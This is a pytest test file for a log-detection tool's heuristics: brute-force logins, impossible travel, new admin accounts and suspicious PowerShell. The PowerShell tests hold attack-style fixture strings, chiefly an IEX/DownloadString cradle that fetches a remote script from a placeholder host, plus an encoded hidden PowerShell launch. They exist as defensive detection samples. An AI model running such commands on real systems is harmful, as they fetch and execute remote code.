import pytest

from log_whisperer.detection.heuristics.brute_force import BruteForceDetector
from log_whisperer.detection.heuristics.impossible_travel import ImpossibleTravelDetector
from log_whisperer.detection.heuristics.new_admin_user import NewAdminUserDetector
from log_whisperer.detection.heuristics.suspicious_powershell import SuspiciousPowerShellDetector, classify
from log_whisperer.store import Store
from tests.helpers import ev, failures

ADMIN = ["administrators", "sudo", "wheel"]


@pytest.fixture
def store():
    s = Store(":memory:")
    yield s
    s.close()


# -- brute force ---------------------------------------------------------------

def test_bruteforce_single_ip(store):
    store.insert_events(failures(12, src_ip="203.0.113.7", user="root"))
    [d] = BruteForceDetector().run(store)
    assert d.severity == "medium" and d.techniques == ["T1110.001"] and len(d.event_ids) == 12
    assert d.src_ips == ["203.0.113.7"] and d.rule_source == "heuristic"


def test_bruteforce_followed_by_success(store):
    store.insert_events(failures(12, src_ip="203.0.113.7", user="root"))
    ok = ev(10, action="ssh_auth", outcome="success", src_ip="203.0.113.7", user="root")
    store.insert_events([ok])
    [d] = BruteForceDetector().run(store)
    assert d.severity == "high" and "T1078" in d.techniques and ok.event_id in d.event_ids


def test_success_too_late_not_included(store):
    store.insert_events(failures(12, src_ip="203.0.113.7"))
    store.insert_events([ev(60, action="ssh_auth", outcome="success", src_ip="203.0.113.7")])
    [d] = BruteForceDetector().run(store)
    assert d.severity == "medium"


def test_below_threshold(store):
    store.insert_events(failures(9, src_ip="203.0.113.7"))
    assert BruteForceDetector().run(store) == []


def test_slow_failures_not_a_burst(store):
    store.insert_events(failures(12, step_sec=60, src_ip="203.0.113.7"))  # 12 over 11 min, max 6 per 5 min
    assert BruteForceDetector().run(store) == []


def test_ip_rotation_detected_per_user(store):
    store.insert_events([e for i in range(12) for e in failures(1, start=i / 6, src_ip=f"198.51.100.{i}", user="alice")])
    [d] = BruteForceDetector().run(store)
    assert d.users == ["alice"] and len(d.src_ips) == 12 and "against alice" in d.rule_title


def test_null_ip_grouped_per_user_not_merged(store):
    store.insert_events(failures(10, user="alice", source_type="evtx", action="logon"))
    store.insert_events(failures(10, user="bob", source_type="evtx", action="logon"))
    dets = BruteForceDetector().run(store)
    assert sorted(d.users[0] for d in dets) == ["alice", "bob"]


def test_since_seq_ignores_old_bursts_but_keeps_id(store):
    store.insert_events(failures(12, src_ip="203.0.113.7"))
    [first] = BruteForceDetector().run(store)
    seq = store.max_seq()
    assert BruteForceDetector().run(store, since_seq=seq) == []
    store.insert_events(failures(3, start=2.5, src_ip="203.0.113.7"))
    [grown] = BruteForceDetector().run(store, since_seq=seq)
    assert grown.detection_id == first.detection_id and len(grown.event_ids) == 15


# -- impossible travel ------------------------------------------------------------

class StubGeo:
    PLACES = {"203.0.113.10": (50.45, 30.52, "UA"), "198.51.100.20": (40.71, -74.0, "US"),
              "203.0.113.11": (50.40, 30.60, "UA")}

    def lookup(self, ip):
        return self.PLACES.get(ip)


def test_impossible_travel(store):
    a = ev(0, action="ssh_auth", outcome="success", user="alice", src_ip="203.0.113.10")
    b = ev(20, action="ssh_auth", outcome="success", user="alice", src_ip="198.51.100.20")
    store.insert_events([a, b])
    [d] = ImpossibleTravelDetector(StubGeo()).run(store)
    assert d.event_ids == [a.event_id, b.event_id] and "UA→US" in d.rule_title and d.severity == "high"


def test_same_city_not_flagged(store):
    store.insert_events([ev(0, action="ssh_auth", outcome="success", user="alice", src_ip="203.0.113.10"),
                         ev(5, action="ssh_auth", outcome="success", user="alice", src_ip="203.0.113.11")])
    assert ImpossibleTravelDetector(StubGeo()).run(store) == []


def test_slow_travel_ok(store):
    store.insert_events([ev(0, action="ssh_auth", outcome="success", user="alice", src_ip="203.0.113.10"),
                         ev(60 * 12, action="ssh_auth", outcome="success", user="alice", src_ip="198.51.100.20")])
    assert ImpossibleTravelDetector(StubGeo()).run(store) == []


def test_private_ip_skipped(store):
    store.insert_events([ev(0, action="ssh_auth", outcome="success", user="alice", src_ip="10.0.0.1"),
                         ev(5, action="ssh_auth", outcome="success", user="alice", src_ip="198.51.100.20")])
    assert ImpossibleTravelDetector(StubGeo()).run(store) == []


def test_no_geoip_disabled(store):
    store.insert_events([ev(0, action="ssh_auth", outcome="success", user="alice", src_ip="203.0.113.10")])
    assert ImpossibleTravelDetector(None).run(store) == []


def test_geoip_missing_file_returns_none(tmp_path, caplog):
    from log_whisperer.detection.geoip import GeoIP, haversine_km

    assert GeoIP.open(tmp_path / "x.mmdb") is None
    assert "disabled" in caplog.text
    assert 7400 < haversine_km((50.45, 30.52), (40.71, -74.0)) < 7600


# -- new admin user ----------------------------------------------------------------

def test_linux_new_sudo_user(store):
    c = ev(0, action="user_created", user="backdoor")
    a = ev(0.5, action="group_member_added", user="backdoor", fields={"group": "sudo"})
    store.insert_events([c, a])
    [d] = NewAdminUserDetector(ADMIN).run(store)
    assert d.event_ids == [c.event_id, a.event_id] and d.techniques == ["T1136.001", "T1098"]


def test_windows_join_by_sid_when_member_name_dash(store):
    c = ev(0, source_type="evtx", host="DC1", action="user_created", user="backdoor",
           fields={"TargetSid": "S-1-5-21-9-1005"})
    a = ev(1, source_type="evtx", host="DC1", action="group_member_added", user=None,
           fields={"TargetUserName": "Administrators", "MemberSid": "S-1-5-21-9-1005"})
    store.insert_events([c, a])
    assert len(NewAdminUserDetector(ADMIN).run(store)) == 1


def test_non_admin_group_ignored(store):
    store.insert_events([ev(0, action="user_created", user="bob"),
                         ev(1, action="group_member_added", user="bob", fields={"group": "users"})])
    assert NewAdminUserDetector(ADMIN).run(store) == []


def test_old_user_not_flagged(store):
    store.insert_events([ev(0, action="user_created", user="bob"),
                         ev(60 * 48, action="group_member_added", user="bob", fields={"group": "sudo"})])
    assert NewAdminUserDetector(ADMIN).run(store) == []


# -- suspicious powershell -----------------------------------------------------------

def test_classify():
    assert classify("powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A") == ["encoded", "hidden", "noprofile"]
    assert classify("IEX (New-Object Net.WebClient).DownloadString('http://x')") == ["iex", "download"]
    assert classify("Get-ChildItem C:\\") == []


def test_encoded_command_high(store):
    e = ev(0, source_type="evtx", action="process_start", process="C:\\x\\powershell.exe",
           command_line="powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0A")
    store.insert_events([e])
    [d] = SuspiciousPowerShellDetector().run(store)
    assert d.severity == "high" and "T1027" in d.techniques and d.techniques[0] == "T1059.001"


def test_script_block_download(store):
    store.insert_events([ev(0, source_type="evtx", action="script_block",
                            command_line="IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')")])
    [d] = SuspiciousPowerShellDetector().run(store)
    assert "T1105" in d.techniques


def test_benign_and_weak_only(store):
    store.insert_events([
        ev(0, source_type="evtx", action="process_start", process="powershell.exe", command_line="powershell Get-ChildItem"),
        ev(1, source_type="evtx", action="process_start", process="powershell.exe", command_line="powershell -nop -w hidden"),
        ev(2, source_type="evtx", action="process_start", process="cmd.exe", command_line="cmd /c iex"),
    ])
    assert SuspiciousPowerShellDetector().run(store) == []
